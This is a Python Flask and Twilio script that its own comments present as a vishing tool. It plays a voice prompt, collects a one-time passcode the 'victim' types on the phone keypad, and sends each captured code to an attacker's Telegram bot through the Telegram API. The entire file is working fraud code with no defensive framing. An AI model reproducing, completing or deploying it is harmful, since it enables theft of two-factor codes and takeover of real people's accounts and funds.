import sys
from configparser import ConfigParser
import requests as req
from flask import Flask, request
from twilio.twiml.voice_response import VoiceResponse, Gather

digits = 5
token = ""
chat = ""
main_msg = ""
retry_msg = ""
final_msg = ""
timeout = 5

app = Flask(__name__)

@app.route("/voice", methods=['GET', 'POST'])
#Defining Function "voice".
def voice():
#Grabs The OTP input by the victim in the dialpad.
    resp = VoiceResponse()
    gather = Gather(num_digits=digits, action='/gather', timeout=timeout)
    gather.say(main_msg)
    resp.append(gather)
    return str(resp)

@app.route('/gather', methods=['GET', 'POST'])
#Defining Function "Gather"
def gather():
    resp = VoiceResponse()
#Send OTP to Telegram Bot.
    if 'Digits' in request.values:
        code = request.values['Digits']
        try:
            req.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chat}&parse_mode=html&text=From Visher Kaspot Your OTP Code = {code}")
        except Exception: pass
        resp.say(final_msg)
        return str(resp)

    resp.say(retry_msg)
    resp.redirect('/voice')
    return str(resp)    

